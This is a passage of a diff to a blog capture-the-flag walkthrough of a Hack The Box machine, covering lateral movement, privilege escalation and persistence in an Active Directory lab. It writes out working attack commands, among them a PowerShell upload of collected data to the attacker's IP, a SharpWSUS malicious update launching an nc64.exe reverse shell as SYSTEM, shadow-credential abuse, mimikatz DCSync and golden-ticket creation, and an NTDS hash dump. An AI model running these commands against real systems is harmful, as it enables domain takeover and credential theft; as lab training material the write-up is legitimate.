+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; $wc.Headers.Add(<span style="color:#e6db74">&#34;Authorization&#34;</span>, <span style="color:#e6db74">&#34;Basic &#34;</span> + [<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#34;bloodstiller:bl00dst1ll3r&#34;</span>))); <span style="color:#66d9ef">try</span> { $response = $wc.UploadData(<span style="color:#e6db74">&#34;https://10.10.14.43:9999&#34;</span>, [<span style="color:#66d9ef">System.IO.File</span>]::ReadAllBytes(<span style="color:#e6db74">&#34;C:\Users\btables\20241011102426_BloodHound.zip&#34;</span>)); Write-Host <span style="color:#e6db74">&#34;Server response: </span>$([<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8.GetString($response))<span style="color:#e6db74">&#34;</span>; Write-Host <span style="color:#e6db74">&#34;File sent successfully!&#34;</span> } <span style="color:#66d9ef">catch</span> { Write-Host <span style="color:#e6db74">&#34;An error occurred: </span>$_<span style="color:#e6db74">&#34;</span> }</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-113819_.png">
+</figure>
+</li>
+<li><strong>File received on our attack host</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-113854_.png">
+</figure>
+</li>
+<li>+Note+: The file will be called <code>uploaded_file</code> you will have to change it back to a  <code>zip</code> file.</li>
+</ul>
+</li>
+</ul>
+</li>
 </ol>
-<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
-<ol>
-<li></li>
-</ol>
-<h2 id="4-dot-ownership">4. Ownership:</h2>
-<h2 id="5-dot-persistence">5. Persistence:</h2>
+<h2 id="3-dot-lateral-movement">3. Lateral Movement:</h2>
+<h3 id="discovering-btables-has-addkeycredentiallink-privilege-over-sflowers">Discovering <code>btables</code> has <code>AddKeyCredentialLink</code> privilege over <code>sflowers</code>:</h3>
+<ul>
+<li>
+<p>After ingesting the data into bloodhound we can see that <code>btables</code> has the <code>AddKeyCredentialLink</code> privilege over <code>sflowers</code>.</p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-10-11-120229_.png">
+</figure>
+
+</li>
+<li>
+<p><strong>We can perform a shadow credentials attack to take advantage of this privilege</strong>:</p>
+<ul>
+<li>If you are unfamiliar with this attack vector I have a write up here:
+<ul>
+<li><a href="https://bloodstiller.com/articles/shadowcredentialsattack/">https://bloodstiller.com/articles/shadowcredentialsattack/</a></li>
+</ul>
+</li>
+<li>To put it simply: If we have the <code>WriteProperty</code> privilege (specifically for the <code>msDS-KeyCredentialLink</code> attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed.</li>
+</ul>
+</li>
+</ul>
+<h3 id="building-whisker-dot-exe">Building <code>whisker.exe</code>:</h3>
+<ul>
+<li><strong>I actually don&rsquo;t the binary in my folder of binaries so will have to build</strong>:
+<ul>
+<li>I open up my windows VM.</li>
+<li>Clone the repo.
+<ul>
+<li><code>git clone https://github.com/eladshamir/Whisker</code></li>
+</ul>
+</li>
+<li>Open up Visual <code>Studio 2022</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-140328_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Build &amp; voila a nice new <code>whisker.exe</code> binary.</li>
+</ul>
+</li>
+</ul>
+<h3 id="adding-shadow-credentials-to-sflowers-using-whisker-dot-exe">Adding Shadow Credentials to <code>sflowers</code> using <code>whisker.exe</code> :</h3>
+<ul>
+<li>
+<p><strong>I transfer</strong> <code>whisker.exe</code> <strong>to the host</strong>:</p>
+<ul>
+<li><code>curl http://10.10.14.43:9000/Whisker.exe -o w.exe</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-163701_.png">
+</figure>
+</li>
+<li>I call it <code>w.exe</code> for no reason other than speed when typing.</li>
+</ul>
+</li>
+<li>
+<p><strong>I set the shadow credentials on the user</strong> <code>sflowers</code>:</p>
+<ul>
+<li><code>w.exe add /target:sflowers /domain:outdated.htb</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-141932_.png">
+</figure>
+</li>
+<li>+Note+: What is great about <code>whisker</code> is that spits out the exact command you will need to run in <code>rubeus</code>.</li>
+</ul>
+</li>
+</ul>
+<h3 id="i-use-the-base64-encoded-certificate-to-request-a-tgt-for-sflowers-using-rubeus">I use the base64 encoded certificate to request a <code>TGT</code> for <code>sflowers</code> using rubeus:</h3>
+<ul>
+<li>
+<p><strong>I run rubeus and pass it the base64 encoded certificate &amp; password</strong>:</p>
+<ul>
+<li><code>r.exe asktgt /user:sflowers /certificate:&lt;base64Cert&gt; /password:&quot;sA1JSl1rVtabQdMp&quot; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Rubeus Command Explained</strong>:</p>
+<ul>
+<li>Uses the certificate to request a Kerberos TGT for Susan Flowers (sflowers)</li>
+<li>The <code>/certificate</code> parameter contains the Base64-encoded certificate</li>
+<li>The <code>/password</code> is for the private key, not Susan&rsquo;s actual AD password</li>
+<li>The <code>/getcredentials</code> flag attempts to decrypt the encrypted NTLM hash from the TGT</li>
+<li>The <code>/show</code> flag displays the ticket details and other information</li>
+<li>If successful, Rubeus receives a TGT and can extract the NTLM hash</li>
+</ul>
+</li>
+<li>
+<p><strong>As a result of this process</strong>:</p>
+<ul>
+<li>Rubeus obtains a TGT for Susan Flowers (sflowers) &amp; generates a <code>.kirbi</code> file which can be used for pass-the-ticket attacks.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-142105_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>It also extracts and displays the user&rsquo;s NTLM hash (due to the <code>/getcredentials</code> flag)
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-142111_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>The ticket details and other information are shown in the output (due to the <code>/show</code> flag)</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the</strong> <code>NTLM</code> <strong>hash is valid using</strong> <code>netexec</code>:</p>
+<ul>
+<li><code>netexec smb $box -u $user -H $hash --share</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-165050_.png">
+</figure>
+</li>
+<li>We can see we have read &amp; write access to the <code>WSUS</code> shares now.</li>
+<li>+Note+: I actually had to restart the box as I was getting some strange errors when trying to authenticate to SMB as <code>sflowers</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-host-as-slfowers">Enumerating the Host as <code>slfowers</code>:</h3>
+<ul>
+<li>
+<p><strong>I connect with</strong> <code>evil-winrm</code>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u $user -H $hash</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Get the flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-143311_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I see that</strong> <code>PsExec64.exe</code> <strong>binary is also on the desktop</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-165303_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="seeing-sflowers-has-outbound-object-control-over-the-ca">Seeing <code>sflowers</code> has outbound object control over the <code>CA</code>:</h3>
+<ul>
+<li>
+<p><strong>I see in bloodhound that sflowers has outbound object control over the</strong> <code>CA</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-144117_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I run</strong> <code>certipy-ad</code> <strong>to see if there are any vulnerable certs</strong>:</p>
+<ul>
+<li><code>certipy-ad find -vulnerable -enabled -u $user@$domain -hashes :$hash -dc-ip $box</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-144001_.png">
+</figure>
+</li>
+<li>I check but there are no vulnerable certs</li>
+</ul>
+</li>
+</ul>
+<h3 id="discovering-sflowers-is-part-of-the-wsus-administrators-group">Discovering <code>sflowers</code> is part of the wsus administrators group:</h3>
+<ul>
+<li><strong>Looking at</strong> <code>sflowers</code> <strong>group memberships we can see she is part of the</strong> <code>wsus administrators</code> <strong>group</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-11-201058_.png">
+</figure>
+</li>
+<li>This could be a viable attack path as if we can push a malicious update via <code>wsus</code> we may be able to escalate our privileges:</li>
+</ul>
+</li>
+</ul>
+<h3 id="what-is-wsus--windows-server-update-services">What is <code>WSUS</code> (Windows Server Update Services)?</h3>
+<ul>
+<li>WSUS (Windows Server Update Services) is a critical component in many corporate Windows environments. It allows administrators to manage and distribute updates centrally.</li>
+</ul>
+<h4 id="wsus-architecture">WSUS Architecture:</h4>
+<ul>
+<li>
+<p><strong>Typical deployment</strong>:</p>
+<ul>
+<li>One WSUS server in the corporate network</li>
+<li>Downloads patches from Microsoft via <code>HTTP/HTTPS</code></li>
+<li>Deploys patches to clients as they check in</li>
+<li>Client communication:
+<ul>
+<li><code>HTTP</code> (port 8530)</li>
+<li><code>HTTPS</code> (port 8531)</li>
+</ul>
+</li>
+<li><figure><img src="/ox-hugo/2024-10-11-181805_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>More complex deployments may involve</strong>:</p>
+<ul>
+<li>Upstream server: Connects to Microsoft, downloads updates</li>
+<li>Downstream servers: Receive updates from upstream, distribute to clients</li>
+<li><figure><img src="/ox-hugo/2024-10-11-181911_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-privilege-escalation">4. Privilege Escalation:</h2>
+<h3 id="manually-enumerating-the-wsus-service-by-querying-the-registry">Manually Enumerating the <code>WSUS</code> Service by querying the registry:</h3>
+<h4 id="enumerating-the-primary-wsus-settings">Enumerating the Primary WSUS Settings:</h4>
+<ul>
+<li><strong>To query the main WSUS settings, use the following command</strong>:
+<ul>
+<li><code>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-200931_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+</span></span><span style="display:flex;"><span>    SetActiveHours    REG_DWORD     0x1
+</span></span><span style="display:flex;"><span>    ActiveHoursStart    REG_DWORD     0x0
+</span></span><span style="display:flex;"><span>    ActiveHoursEnd    REG_DWORD     0x17
+</span></span><span style="display:flex;"><span>    AcceptTrustedPublisherCerts    REG_DWORD     0x1
+</span></span><span style="display:flex;"><span>    ExcludeWUDriversInQualityUpdate    REG_DWORD     0x1
+</span></span><span style="display:flex;"><span>    DoNotConnectToWindowsUpdateInternetLocations    REG_DWORD     0x1
+</span></span><span style="display:flex;"><span>    WUServer    REG_SZ     http<span style="color:#960050;background-color:#1e0010">:</span>//wsus.outdated.htb<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8530</span>
+</span></span><span style="display:flex;"><span>    WUStatusServer    REG_SZ     http<span style="color:#960050;background-color:#1e0010">:</span>//wsus.outdated.htb<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8530</span>
+</span></span><span style="display:flex;"><span>    UpdateServiceUrlAlternate    REG_SZ</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Key Findings</strong>:
+<ul>
+<li>
+<p><code>SetActiveHours</code>:</p>
+<ul>
+<li><code>ActiveHoursStart</code> Start = 0x0 (12:00 AM)</li>
+<li><code>ActiveHoursEnd</code> End = 0x17 (11:00 PM)</li>
+<li>Updates are allowed to install at any time</li>
+</ul>
+</li>
+<li>
+<p><code>AcceptTrustedPublisherCerts = 1</code></p>
+<ul>
+<li>The system accepts certificates from trusted publishers for updates</li>
+</ul>
+</li>
+<li>
+<p><code>DoNotConnectToWindowsUpdateInternetLocations = 1</code></p>
+<ul>
+<li>The system is configured to not connect directly to Windows Update</li>
+<li>All updates must come through the WSUS server</li>
+</ul>
+</li>
+<li>
+<p><code>WSUSServer</code>:</p>
+<ul>
+<li><a href="http://wsus.outdated.htb:8530">http://wsus.outdated.htb:8530</a></li>
+<li>This is the central update server for the organization</li>
+<li><strong>Connection Security: HTTP (unencrypted)</strong>:
+<ul>
+<li>The connection to the WSUS server uses HTTP instead of HTTPS
+<ul>
+<li>Seen in the url  <a href="http://wsus.outdated.htb:8530">http://wsus.outdated.htb:8530</a> &amp; that it&rsquo;s using port 8530</li>
+</ul>
+</li>
+<li>This could potentially expose update traffic to interception</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-the-automatic-update-settings">Enumerating the Automatic Update Settings:</h4>
+<ul>
+<li><strong>To query specific automatic update settings</strong>:
+<ul>
+<li><code>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU</code></li>
+<li><figure><img src="/ox-hugo/2024-10-11-200951_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="HKEY_LOCAL_MACHINE%5cSoftware%5cPolicies%5cMicrosoft%5cWindows%5cWindowsUpdate%5cAU%0a%20%20%20%20AutoInstallMinorUpdates%20%20%20%20REG_DWORD%20%20%20%20%200x1%0a%20%20%20%20NoAutoUpdate%20%20%20%20REG_DWORD%20%20%20%20%200x0%0a%20%20%20%20AUOptions%20%20%20%20REG_DWORD%20%20%20%20%200x3%0a%20%20%20%20ScheduledInstallDay%20%20%20%20REG_DWORD%20%20%20%20%200x0%0a%20%20%20%20ScheduledInstallTime%20%20%20%20REG_DWORD%20%20%20%20%200x3%0a%20%20%20%20ScheduledInstallEveryWeek%20%20%20%20REG_DWORD%20%20%20%20%200x1%0a%20%20%20%20UseWUServer%20%20%20%20REG_DWORD%20%20%20%20%200x1">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+</span></span><span style="display:flex;"><span>    AutoInstallMinorUpdates    REG_DWORD     0x1
+</span></span><span style="display:flex;"><span>    NoAutoUpdate    REG_DWORD     0x0
+</span></span><span style="display:flex;"><span>    AUOptions    REG_DWORD     0x3
+</span></span><span style="display:flex;"><span>    ScheduledInstallDay    REG_DWORD     0x0
+</span></span><span style="display:flex;"><span>    ScheduledInstallTime    REG_DWORD     0x3
+</span></span><span style="display:flex;"><span>    ScheduledInstallEveryWeek    REG_DWORD     0x1
+</span></span><span style="display:flex;"><span>    UseWUServer    REG_DWORD     0x1</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Key Findings</strong>:
+<ul>
+<li>
+<p><code>AutoInstallMinorUpdates = 1</code></p>
+<ul>
+<li>Minor Updates: Auto-install</li>
+<li>Small updates are installed without user intervention</li>
+</ul>
+</li>
+<li>
+<p><code>NoAutoUpdate = 0</code></p>
+<ul>
+<li>Automatic Updates: Enabled</li>
+<li>The system will automatically check for and download updates</li>
+</ul>
+</li>
+<li>
+<p><code>AUOptions = 3</code></p>
+<ul>
+<li>Update Installation: Automatic:</li>
+<li>Updates will be downloaded and installed automatically</li>
+</ul>
+</li>
+<li>
+<p><code>ScheduledInstallEveryWeek = 1</code></p>
+<ul>
+<li>Update Schedule:
+<ul>
+<li>Day: 0 (Every day)</li>
+<li>Time: 3 (3:00 AM)</li>
+<li>Frequency: Weekly</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>UseWUServer = 1</code></p>
+<ul>
+<li>Update Source: WSUS Server</li>
+<li>Confirms that the system is using the configured WSUS server</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="analysis-and-implications-of-the-results">Analysis and Implications of the results:</h4>
+<ul>
+<li>
+<p><strong>Security Concerns</strong>: The use of an unencrypted HTTP connection to the WSUS server could pose a security risk, potentially allowing for man-in-the-middle attacks.</p>
+<ul>
+<li>E.G. Us right now.</li>
+</ul>
+</li>
+<li>
+<p><strong>Automatic Update Behavior</strong>: The system is set to automatically install updates, which helps maintain system security but also means if we push an update it will be automatically installed!</p>
+</li>
+<li>
+<p><strong>Update Control</strong>: The system is fully reliant on the WSUS server for updates, as it&rsquo;s configured not to connect to Windows Update directly.</p>
+</li>
+<li>
+<p><strong>Scheduled Updates</strong>: Updates are scheduled to install weekly <code>ScheduledInstallEveryWeek = 1</code>, which suggests a regular maintenance window.</p>
+</li>
+<li>
+<p><strong>Attack Path</strong>:</p>
+<ul>
+<li>I will attempt to push a malicious update using the tool <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="using-sharpwsus-to-push-a-malicious-update">Using <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a> to push a malicious update:</h3>
+<h4 id="building-sharpwsus">Building <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a>:</h4>
+<ul>
+<li><strong>Again I don&rsquo;t have a sharpWSUS binary in my common binaries so will have to build it</strong>:
+<ul>
+<li>I open up my windows VM.</li>
+<li>Clone the repo.
+<ul>
+<li><code>git clone https://github.com/nettitude/SharpWSUS.git</code></li>
+</ul>
+</li>
+<li>Open up Visual <code>Studio 2022</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-12-075608_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Build &amp; voila a nice new <code>sharpWSUS.exe</code> binary.</li>
+</ul>
+</li>
+</ul>
+<h4 id="using-sharpwsus-to-trigger-a-reverse-shell-as-system">Using <code>SharpWSUS</code> to trigger a reverse shell as system:</h4>
+<ul>
+<li><strong>Looking at the creators blog-post about the tool I see the following paragraph</strong>:</li>
+</ul>
+<blockquote>
+<p>While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL on a network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog will use PsExec.exe for code execution (<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>).</p>
+<p>A patch leveraging PsExec.exe can be done with the following command:</p>
+<p>SharpWSUS.exe create /payload:&ldquo;C:\Users\ben\Documents\pk\psexec.exe&rdquo; /args:&quot;-accepteula -s -d cmd.exe /c \&ldquo;net user WSUSDemo Password123! /add &amp;&amp; net localgroup administrators WSUSDemo /add\&rdquo;&quot; /title:&ldquo;WSUSDemo&rdquo;</p>
+</blockquote>
+<ul>
+<li><a href="https://labs.nettitude.com/blog/introducing-sharpwsus/">https://labs.nettitude.com/blog/introducing-sharpwsus/</a></li>
+<li>If you remember correctly <code>sflowers</code> had a <code>PsExec64.exe</code> binary on her desktop so this gives us a valid attack path.</li>
+</ul>
+<h5 id="creating-a-malicious-update-with-sharpwsus">Creating a Malicious Update with <code>SharpWSUS</code>:</h5>
+<ul>
+<li><strong>I create my</strong> <code>SharpWSUS</code> <strong>payload to trigger an</strong> <code>nc64.exe</code> <strong>binary I have uploaded</strong>
+<ul>
+<li><code>.\SharpWSUS.exe create /payload:&quot;C:\Users\sflowers\Desktop\PsExec64.exe&quot; /args:&quot;-accepteula -s -d C:\Users\sflowers\Documents\nc64.exe -e cmd.exe 10.10.14.43 443&quot; /title:&quot;EmergencyUpdate&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-082517_.png">
+</figure>
+</li>
+<li>+Note+: You can see at the bottom of the output it tells us the next command we need to run in order to push this malicious update.</li>
+</ul>
+</li>
+</ul>
+<h5 id="approving-our-malicious-update-with-sharpwsus">Approving our Malicious Update with <code>SharpWSUS</code>:</h5>
+<ul>
+<li>
+<p><strong>Approve the update</strong>:</p>
+<ul>
+<li><code>.\SharpWSUS.exe approve /updateid:bdf7d92c-2b96-42c3-b615-fc207c9d49af /computername:dc.outdated.htb /groupname:&quot;EmergencyUpdate&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-082756_.png">
+</figure>
+</li>
+<li>+Note+:
+<ul>
+<li>Be patient it can take a minute or longer in real life depending on update schedules etc.
+<ul>
+<li>In real life this could take upto a week etc if updates are only pushed weekly and under certain circumstances.</li>
+</ul>
+</li>
+<li><code>/groupname:</code> = the <code>/title:</code> we set in the previous step e.g. <code>&quot;EmergencyUpdate&quot;</code></li>
+<li>Remember to modify the <code>/computername:</code> to be the FQDN of the target you are attacking.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Shell Caught</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-12-082736_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-persistence">4. Persistence:</h2>
+<h3 id="creating-a-golden-ticket-with-mimikatz-dot-exe">Creating a golden ticket with <code>mimikatz.exe</code>:</h3>
+<ul>
+<li>
+<p><strong>I upload mimikatz via the existin evil-winrm session with</strong> <code>sflowers</code>:</p>
+<ul>
+<li>I perform a dcsync attack and dump the krbtgt hash:</li>
+<li><code>lsadump::dcsync /user:krbtgt /domain:outdated.htb</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-084028_.png">
+</figure>
+</li>
+<li>I get the <code>SID</code>, <code>KRBTGT NTLM</code> hash which is all I need to perform my Golden Ticket Attack.</li>
+</ul>
+</li>
+<li>
+<p><strong>I create my golden ticket</strong>:</p>
+<ul>
+<li><code>kerberos::golden /domain:outdated.htb /user:Administrator /sid:S-1-5-21-4089647348-67660539-4016542185 /rc4:&lt;redacted&gt;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-084203_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I transfer the ticket via</strong> <code>evil-winrm</code>:</p>
+</li>
+<li>
+<p><strong>Convert with</strong> <code>impacket-ticketconverter</code>:</p>
+<ul>
+<li><code>impacket-ticketConverter ticket.kirbi admin.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-084327_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Import into session my current session</strong>:</p>
+<ul>
+<li><code>export KRB5CCNAME=./admin.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-084407_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Syncronise my time with the Domain Controller</strong>:</p>
+<ul>
+<li><code>sudo ntpdate -s dc.$domain</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-084444_.png">
+</figure>
+</li>
+<li>+Note+: As kerberos uses time based security checks this is important</li>
+</ul>
+</li>
+<li>
+<p><strong>Check the ticket is in memory</strong>:</p>
+<ul>
+<li><code>klist</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-084641_.png">
+</figure>
+</li>
+<li>If you look we can see this ticket is valid for 10 years so as long no-one changes the <code>krbtgt</code> password (which is unlikely) we will have persistence.</li>
+</ul>
+</li>
+<li>
+<p><strong>Connect Using my ticket using</strong> <code>impacket-psexec</code>:</p>
+<ul>
+<li><code>impacket-psexec dc.$domain -k</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-084756_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="dumping-ntds-for-fun-for-fun-and-profit">Dumping NTDS for fun for fun and profit:</h3>
+<ul>
+<li>
+<p>Now that we have persistence we might as well pillage:</p>
+</li>
+<li>
+<p><strong>I perform a DCSync attack using netexec and dump all hashes</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u administrator --use-kcache -M ntdsutil</code></li>
+<li><figure><img src="/ox-hugo/2024-10-12-085001_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
 <h2 id="lessons-learned">Lessons Learned:</h2>
 <h3 id="what-did-i-learn">What did I learn?</h3>
 <ol>
-<li></li>
-<li></li>
-<li></li>
+<li>I learned about the follina exploit, I had never used that exploit previously so was interesting using purely the malicious HTML part as a delivery mechanism for our exploit.</li>
+<li>I learned a lot about WSUS. Looking at the different architecture options available and how to query the registry was interesting from an enumeration point of view.</li>
+<li>I learned about the process of doing a shadow credentials attack. I even stopped the box halfway to do a deep-dive and made a blog post I found it so interesting:
+<ul>
+<li><a href="https://bloodstiller.com/articles/shadowcredentialsattack/">https://bloodstiller.com/articles/shadowcredentialsattack/</a></li>
+</ul>
+</li>
 </ol>
 <h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
 <ol>
-<li></li>
-<li></li>
+<li>Trying to download to <code>C:\\Temp\\</code> you know the FAMOUS non-existent directory in windows!</li>
+<li>I had a couple of real dense moments when I was tired &amp; over-thinking about how I could use the malicious Follina <code>html</code> instead of just sending the link.</li>
+<li>Oh, for some reason I kept forgetting to add the title with SharpWSUS.</li>
 </ol>
 <h2 id="sign-off">Sign off:</h2>
 <p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
 <p>Until next time, hack the planet!</p>
 <p>– Bloodstiller</p>
 <p>– Get in touch bloodstiller at proton dot me</p>
-<h2 id="9c69d6"><del>CREDS</del>:</h2>
-<h3 id="ssh-keys">SSH Keys:</h3>
-<h3 id="compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</h3>
-<h4 id="usernames">Usernames:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="sflowers%0aitsupport">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>sflowers
-</span></span><span style="display:flex;"><span>itsupport</span></span></code></pre></div>
-    
-</div>
-<h4 id="emails">Emails:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="sflowers@outdated.htb%0aitsupport@outdated.htb">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>sflowers@outdated.htb
-</span></span><span style="display:flex;"><span>itsupport@outdated.htb</span></span></code></pre></div>
-    
-</div>
-<h4 id="passwords">Passwords:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
-    
-</div>
-<h4 id="username-and-pass">Username &amp; Pass:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
-    
-</div>
-<h4 id="hashes">Hashes:</h4>
-
-
-
-
-
-
-
-<div class="codeblock">
-    
-        <div class="copy-button-box">
-            <button class="copy-button" state="copy" data="">
-                <i class="bi bi-copy"></i>
-            </button>
-        </div>
-    
-
-    
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"></code></pre></div>
-    
-</div>
 
             
         </div>
@@ -1464,7 +2368,7 @@
                 <li>
                     
                         Word Count:
-                        2412
+                        5303
                     
                 </li>
             
@@ -1500,7 +2404,7 @@
                     
                         Last modified: &nbsp;
                         <time>
-                            Oct 10 2024 00:00:00
+                            Oct 13 2024 00:00:00
                         </time>
                     
                 </li>
@@ -1550,8 +2454,8 @@
         
         <script
             type="text/javascript"
-            src="/_theme/js/custom.baf1622c95b2ed38ea638ca259c323d2a5537d258fb923994e97539b4c4ecf706c7992482768366adddcb83153dce8c33f5fc95a5c8abe6b2a03046892509fae.js"
-            integrity="sha512-uvFiLJWy7TjqY4yiWcMj0qVTfSWPuSOZTpdTm0xOz3BseZJIJ2g2at3cuDFT3OjDP1/JWlyKvmsqAwRoklCfrg=="></script>
